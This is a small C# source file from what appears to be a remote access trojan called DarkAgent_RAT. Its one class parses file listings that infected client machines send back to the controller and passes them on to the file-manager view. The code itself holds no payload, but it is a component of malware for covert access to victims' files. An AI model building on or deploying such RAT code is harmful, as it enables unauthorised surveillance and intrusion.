using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_RAT.src.Objects;
using DarkAgent_RAT.src.Events;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Receive
{
    class R_FileMgrGetFiles : ReceiveBasePacket
    {
        public R_FileMgrGetFiles(RatClients client, byte[] packet)
            : base(client, packet)
        {
        }

        FileMgrFileInfo info = new FileMgrFileInfo();
        public override void Read()
        {
            info.FileName = ReadString();
            info.Extension = ReadString();
            info.Date = ReadString();
            info.Size = ReadString();
            info.FileLocation = ReadString();
            info.IconHandle = ReadInteger();
        }

        public override void Run()
        {
            FileMgrFileEventArgs e1 = new FileMgrFileEventArgs(info, Client.RemoteEndPoint.ToString());
            FileMgrFileEvent.OnFileMgrFile(e1);
            info = null; //clean memory
        }
    }
}
